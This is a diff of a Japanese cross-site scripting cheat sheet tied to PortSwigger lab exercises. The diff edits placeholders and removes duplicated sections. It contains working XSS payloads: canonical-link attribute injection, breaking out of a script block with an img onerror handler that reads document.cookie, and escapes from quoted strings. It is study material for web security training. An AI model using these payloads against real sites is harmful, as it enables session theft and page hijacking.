@@ -163,7 +163,7 @@ http://example/?'accesskey='x'onclick='alert(1)
 ```
 ↓
 ```html
-<link rel="canonical" href="https://example/?" accesskey="x" onclick="alert(1)">
+<link rel="canonical" href="https://<example>/?" accesskey="x" onclick="alert(1)">
 ```
 
 ---
@@ -176,59 +176,51 @@ http://example/?'accesskey='x'onclick='alert(1)
 
 ```js
 <script>
-    var input = 'ここに入力';
+    var input = '<user_input>';
 </script>
 ```
 
 2. 既存のスクリプトを閉じさせてペイロードを注入する
-
 ```js
 </script><img src=1 onerror=alert(document.cookie)>
 ```
 
 ### 引用符で囲まれた文字列からの脱却
 
-**基本：**
-
+基本
 ```js
 '-alert(1)-'
 ```
-
 ```js
 ';alert(1)//
 ```
 
 **引用符がバックスラッシュでエスケープされるケース：**
-
 1. 引用符（`'` or `"`）を入力し、`\` でエスケープされることを確認する
 2. `\` を入力し、エスケープされない脆弱性があるか確認する
 3. ペイロードに `\` を追加して送信する
-
 ```js
 \';alert(1)//'
 ```
 
 ### HTMLエンコードの利用
 
-引用符で囲まれた属性値にJavaScriptが存在するとき：
-
+引用符で囲まれた属性値にJavaScriptが存在するとき
 ```html
-<a href="#" onclick="... var input='ここに入力'; ...">
+<a href="#" onclick="... var input='<user_input>'; ...">
 ```
 
-引用符をHTMLエンコードして脱却する：
-
+引用符をHTMLエンコードして脱却する
 ```js
 &apos;-alert(1)-&apos;
 ```
 
-URLとして組み込む場合：
-
+URLとして組み込む場合
 ```url
 http://foo?&apos;-alert(1)-&apos;
 ```
 
-🔗[Lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
+🔗[Web Security Academy Lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
 
 ### JSテンプレートリテラルへの注入
 
@@ -465,24 +457,6 @@ GET /?search=<有効なタグ%20§§=1> HTTP/2
 
 ---
 
-### headタグ内にcanonicalが設定されているケース
-
-1. `<head>`タグ内に`canonical`が設定されていることを確認する
-2. 適当なクエリストリングを検索し、`<link rel="canonical" href="">`のhrefに反映されるか試す
-```html
-<link rel="canonical" href='https://example/?aaa'/>
-```
-
-3. hrefに反映されることを悪用し、payloadを注入する。
-```
-http://example/?'accesskey='x'onclick='alert(1)
-```
-	↓
-```html
-<link rel="canonical" href="https://example/?" accesskey="x" onclick="alert(1)">
-```
-
----
 ## JavaScriptへのXSS
 
 ### 既存のスクリプトを強制終了させ任意のJSを実行する方法
@@ -501,28 +475,7 @@ http://example/?'accesskey='x'onclick='alert(1)
 ```
 
 ---
-### 引用符('or")で囲まれた文字列からの脱却
 
-###### 基本的な文字列からの脱却
-
-```js
-'-alert(1)-'
-```
-```js
-';alert(1)//
-```
-- 前後に適当な文字列を入れる場合もある(`aa'-alert(1)-'aa)
-
-###### 引用符がエスケープされるケース
-
-1. 引用符(`'`or`"`)を入力し、`\`でエスケープされることを確認する
-2. `\`を入力し、エスケープされない脆弱性があるか確認する
-3. 基本的なpayloadに`\`を追加して送信する
-```js
-\';alert(1)//'
-```
-
----
 ### HTMLエンコードの利用
 
 - 引用符で囲まれた属性値にJavaScriptが存在するとき
